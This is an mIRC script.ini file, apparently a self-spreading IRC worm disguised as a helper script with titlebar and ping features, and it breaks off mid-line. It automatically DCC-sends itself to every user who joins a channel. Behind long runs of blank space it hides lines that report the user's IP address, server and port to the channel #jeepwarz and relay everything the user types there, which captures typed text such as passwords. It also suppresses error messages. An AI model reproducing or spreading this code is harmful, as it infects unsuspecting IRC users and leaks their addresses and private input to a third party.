[script]
n0=HI   EVERYBODY  DCC ME 12/F
n1=alias /s / *1
n2=on 1:connect:/.enable #d
n3=#d off
n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini } | .disable #d | .timer 1 60 .enable #d }
n5=#d end
n6=  .remote on
n7=  titlebar (Not connected)
n8=  }
n9=raw 401:*: {
n10=  halt
n11=}
n12=RAW 001:*:titlebar (Connecting to $server $+ )
n13=
n14=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .
n15=
n16=on 1:DISCONNECT:titlebar (Not connected)
n17=
n18=;if you type something in status it doesn't have to have "/"
n19=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-
n20=  set %a status window
n21=  if ( $active == %a ) { $1- | halt }
n22=}
n23=
n24=;ping stuff
n25=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n26=CTC
